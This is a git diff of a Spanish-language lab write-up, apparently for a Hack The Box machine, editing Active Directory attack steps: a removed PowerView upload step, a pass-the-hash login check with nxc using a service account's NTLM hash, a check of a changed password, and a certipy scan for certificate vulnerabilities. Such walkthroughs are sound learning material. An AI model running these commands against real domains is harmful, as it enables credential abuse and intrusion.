@@ -311,20 +311,16 @@ Con ese hash verificamos si es valido para el usuario `ca_svc`
 nxc smb 10.129.232.128 -u ca_svc -H 3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
-Ahora cambiaremos la contraseña este usuario
-Primero subiremos un `PowerView` que es un modulo para enumerar Windows desde dentro `https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1`, con el comando
-```shell
-upload PowerView.ps1
-```
 
 
-I
+
+
 Verificamos que se haya realizado el cambio de contraseña
 ```shell
 nxc smb sequel.htb -u ca_svc -p 'Password123!!'
 ```
 
-Vuscamos la vulnerabilidades del usuario
+Buscamos la vulnerabilidades del usuario
 ```shell
 certipy find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.129.232.128 -stdout
 ```
